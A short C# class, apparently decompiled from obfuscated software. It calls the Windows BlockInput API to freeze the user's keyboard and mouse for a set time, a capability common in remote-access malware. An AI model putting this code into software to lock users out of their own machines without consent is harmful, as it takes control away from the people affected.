using System.Runtime.InteropServices;
using System.Threading;

namespace ns0;

internal class Class11
{
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool BlockInput(bool BlockIt);

	public static void smethod_0(int time)
	{
		BlockInput(BlockIt: true);
		Thread.Sleep(time);
		BlockInput(BlockIt: false);
	}
}
